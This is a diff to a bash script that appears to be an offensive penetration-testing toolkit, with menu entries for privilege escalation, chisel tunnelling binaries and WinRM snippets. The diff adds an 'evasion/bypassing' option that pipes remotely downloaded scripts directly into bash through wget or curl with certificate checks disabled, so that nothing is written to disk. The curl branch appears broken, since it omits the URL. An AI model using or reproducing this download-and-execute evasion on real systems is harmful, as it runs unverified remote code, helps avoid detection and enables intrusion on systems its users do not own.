@@ -4,6 +4,7 @@
 #email: 4starfds@gmail.com
 
 WGET="2"
+SEC="0"
 WGETP=$(which wget)
 CURLP=$(which curl)
 
@@ -25,10 +26,20 @@ function Scarica
 	echo "downloading $1"
 	if [[ "$WGET" == "0" ]];
 	then
-		$WGETP --no-check-certificate "$2" -O "$3"
+		if [[ "$SEC" == "1" ]];
+		then
+			$WGETP -O - --no-check-certificate "$2" | bash
+		else
+			$WGETP --no-check-certificate "$2" -O "$3"
+		fi
 	elif [[ "$WGET" == "1" ]];
 	then
-		$CURLP -k -L -o "$3" "$2"
+		if [[ "$SEC" == "1" ]];
+		then
+			$CURLP -k -L | bash
+		else
+			$CURLP -k -L -o "$3" "$2"
+		fi
 	fi
 	if [[ -f ./$3 ]];
 	then
@@ -131,7 +142,7 @@ while true; do
 	echo -ne " 197. PrivEsc with find and awk\t198. PrivEsc with less\t199. PrivEsc with more\n"
 	echo -ne " 200. list all bins with perm 400 root\t201. PrivEsc with nano\t202. PrivEsc with apache2\n"
 	echo -ne " 203. PrivEsc with LP_PRELOAD\t204. get capabilities\t205. PrivEsc with python\n"
-	echo -ne " 210. Decode, unzip and decrypt a file from linuxallremote\n"
+	echo -ne " 210. Decode, unzip and decrypt a file from linuxallremote\t\t\t\t218. Set an higher level of evasion/bypassing piping scripts\n"
 	echo "WINRM"
 	echo -ne " 132. Alamot/code-snippets/winrm/\n"
 	echo "OTHERS"
@@ -1003,6 +1014,15 @@ while true; do
 	;;
 	"217")
 		Scarica "jpillora/chisel_armv6" "$ENTSSL""jpillora/chisel/releases/download/v1.7.4/chisel_1.7.4_linux_armv6.gz" "chisel_1.7.4_linux_armv6.gz"
+	;;
+	"218")
+		echo "Do you want to set an higher level of bypassing/evasion"
+		echo "An higher level of evasion/bypassing will pipe download scripts in a bash thread"
+		read -p "Digit 1 to enable, 0 (zero) to disable" SEC
+		if [[ "$SEC" != "1" ]];
+		then
+			SEC="0"
+		fi
 	;;
 	*)
 		echo "error, invalid choice"
